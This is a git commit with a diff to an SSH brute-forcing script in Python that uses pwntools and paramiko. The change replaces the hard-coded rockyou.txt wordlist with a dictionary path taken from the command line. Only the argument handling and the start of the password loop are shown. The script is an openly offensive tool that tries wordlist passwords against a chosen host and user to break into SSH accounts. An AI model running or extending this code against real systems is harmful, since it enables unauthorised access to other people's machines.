1bbbea27bece81d3254a2349f3279d2419552578
Facundo Ceballos <63003518+facundoic@users.noreply.github.com>
2022-09-05 14:13:09 -0300

    Update ssh-brute-forcing.py

--- ssh-brute-forcing.py
+++ ssh-brute-forcing.py
@@ -3,15 +3,15 @@ import string
 from pwn import *
 import paramiko
 
-if len(sys.argv) < 3:
-    print("[*] Use : python3 ssh-brute-forcing.py <host> <user>")
+if len(sys.argv) < 4:
+    print("[*] Use : python3 ssh-brute-forcing.py <host> <user> <dictionary-path>")
     sys.exit(1)
 
 host = sys.argv[1]
 username = sys.argv[2]
+dictionary = sys.argv[3]
 
-
-with open("rockyou.txt", "r") as password_list:
+with open(dictionary, "r") as password_list:
     for password in password_list:
         password = password.strip("\n")
         try:
